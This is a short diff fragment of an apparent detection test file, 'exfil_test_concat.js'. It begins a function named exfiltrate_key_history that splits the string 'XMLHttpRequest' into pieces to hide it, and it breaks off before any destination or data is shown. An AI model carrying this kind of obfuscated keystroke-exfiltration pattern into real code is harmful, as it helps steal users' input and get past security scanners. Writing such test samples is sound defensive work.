@@ -1,3 +1,4 @@
+// exfil_test_concat.js
 function exfiltrate_key_history() {
   var a = "xmlhttp=new XMLHt";
   var b = "tpRequest();";
